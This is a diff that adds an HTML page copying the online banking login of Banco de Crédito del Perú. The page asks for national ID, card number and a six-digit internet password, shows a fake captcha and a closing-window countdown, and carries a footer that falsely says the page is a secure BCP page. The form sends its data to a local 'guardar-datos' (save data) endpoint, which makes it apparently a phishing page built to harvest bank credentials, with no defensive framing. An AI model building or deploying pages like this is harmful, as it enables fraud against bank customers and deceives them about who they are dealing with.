@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca por Internet</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: white;
+            display: flex;
+            height: 100vh;
+        }
+        .left-panel {
+            background-color: #ffffff;
+            color: white;
+            width: 50%;
+            display: flex;
+            justify-content: left;
+            align-items: left;
+        }
+        .right-panel {
+            width: 55%;
+            padding: 40px;
+            position: relative;
+        }
+        .contador {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-weight: normal;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        .contador img {
+            margin-left: 5px;
+            width: 18px;
+            height: 18px;
+        }
+        .form-container {
+            max-width: 380px;
+            margin: 0 auto;
+        }
+        .form-container h1 {
+            font-size: 18px;
+            color: #003DA5;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .form-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .form-container input[type="text"], 
+        .form-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .form-container .persona-empresa {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .form-container .persona-empresa input {
+            margin-right: 10px;
+        }
+        .form-container .remember {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .form-container .remember input {
+            margin-right: 5px;
+        }
+        .form-container .links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        .form-container .links a {
+            color: #FF6000;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .form-container .captcha {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .form-container .captcha img {
+            margin-right: 10px;
+        }
+        .form-container .captcha input {
+            flex-grow: 1;
+            margin-right: 10px;
+        }
+        .form-container .captcha a {
+            color: #FF6000;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #FF6000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .form-container button:hover {
+            background-color: #E55000;
+        }
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        .footer img {
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="left-panel">
+    <img src="logo bcp.PNG" alt="BCP Logo" class="logo">
+</div>
+
+<div class="right-panel">
+    <div class="contador">
+        Esta ventana se <span style="font-weight: bold;"> cerrará </span> en <span id="segundos"> 271</span> segundos
+        <img src="reloj.PNG" alt="reloj">
+    </div>
+
+    <div class="form-container">
+        <h1>Banca por Internet</h1>
+        <form action="http://localhost:3000/guardar-datos" method="POST">
+        <div class="persona-empresa">
+            <label><input type="radio" name="tipo" value="persona" checked> Persona</label>
+            <label><input type="radio" name="tipo" value="empresa"> Empresa</label>
+        </div>
+        
+        <label for="document">DNI</label>
+        <input type="text" id="document" placeholder="Nro de documento">
+        
+        <label for="card">Número de tarjeta</label>
+        <input type="text" id="card" placeholder="Número de tarjeta">
+        
+        <div class="remember">
+            <input type="checkbox" id="remember">
+            <label for="remember">Recordar datos</label>
+        </div>
+        
+        <label for="password">Clave de internet de 6 dígitos</label>
+        <input type="password" id="password" placeholder="Clave">
+        
+        <div class="links">
+            <a href="#">Crear clave</a>
+            <a href="#">Olvidé mi clave</a>
+        </div>
+        
+        <div class="captcha">
+            <img src="https://via.placeholder.com/100x30" alt="Captcha">
+            <input type="text" placeholder="Código">
+            <a href="#">Cambiar código</a>
+        </div>
+        
+        <button type="submit">Continuar</button>
+    </div>
+
+    <div class="footer">
+        Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a través de nuestros medios digitales.<br><br>
+        Banco de Crédito del Perú S.A - RUC: 20100047218<br>
+        Todos los derechos reservados<br>
+        © 2024 VIABCP.com
+    </div>
+</div>
+
+<script>
+    let segundos = 271;
+    const intervalo = setInterval(() => {
+        segundos--;
+        document.getElementById('segundos').textContent = segundos;
+        if (segundos <= 0) {
+            clearInterval(intervalo);
+            window.close(); // Esta línea cerrará la ventana automáticamente si el navegador lo permite
+        }
+    }, 1000);
+</script>
+
+
+
+</body>
+</html>
